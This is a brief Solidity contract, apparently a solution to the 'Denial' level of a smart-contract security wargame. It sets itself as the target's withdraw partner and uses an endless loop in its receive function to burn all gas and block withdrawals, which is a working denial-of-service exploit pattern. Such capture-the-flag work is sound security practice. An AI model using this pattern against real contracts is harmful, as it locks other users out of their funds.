// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Denial } from "./Level20.sol";

contract L20Attack {
    Denial instance;
    uint256 value;

    constructor(Denial _instance) {
        instance = _instance;
        instance.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) { }
    }
}
